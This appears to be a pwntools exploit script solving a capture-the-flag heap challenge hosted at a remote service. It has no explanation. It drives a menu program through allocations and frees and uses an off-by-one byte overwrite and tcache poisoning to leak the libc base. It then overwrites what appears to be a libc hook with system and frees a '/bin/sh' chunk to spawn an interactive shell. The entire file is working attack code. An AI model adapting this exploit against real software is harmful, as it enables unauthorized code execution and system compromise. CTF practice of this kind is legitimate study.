from pwn import *
context.log_level='debug'
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# p=process('./chall',env={'LD_PRELOAD':"./libc-2.27.so"})
p = remote("mc.ax",32526)
ru         = lambda a:     p.readuntil(a)
r         = lambda n:        p.read(n)
sla     = lambda a,b:     p.sendlineafter(a,b)
sa         = lambda a,b:     p.sendafter(a,b)
sl        = lambda a:     p.sendline(a)
s         = lambda a:     p.send(a)
def add(size,val=b"A"):
    sla(b"> ",b"1")
    sla(b"? ",str(size).encode())
    sa(b'? ',val)
def opt(idx,x):
    sla("> ","2")
    sla(b"? ",str(idx).encode())
    sla(b'? ',x)
def free(idx):
    sla("> ","3")
    sla(b"? ",str(idx).encode())
for x in range(7):
    add(0x88)
add(0x500)#7
add(0x88)#8
add(0x18)#9
free(7)
add(0x18,"A"*0x18)#7
opt(7,b"\xf1")
add(0x88)#10
add(0x88)#11

for x in range(7):
    free(x)
free(10)
free(8)

add(0x578,b'\n')#0
opt(0,b'\0')
base = u64(p.read(6)+b'\0\0')  - (0x7ffff7dcdc0a-0x7ffff79e2000)
info(hex(base))
# gdb.attach(p,'b *0x5555554009F9')

add(0xa0)#1
add(0xa0)#2
add(0xa0)#3
free(3)
free(2)
free(1)
free(0)
pay = b'\0'*0x120+flat([0x3ed8e8+base-8])
add(0x578,pay)
add(0xa0)
add(0xa0,b"/bin/sh\0"+p64(base+0x4f420))
free(2)

p.interactive()
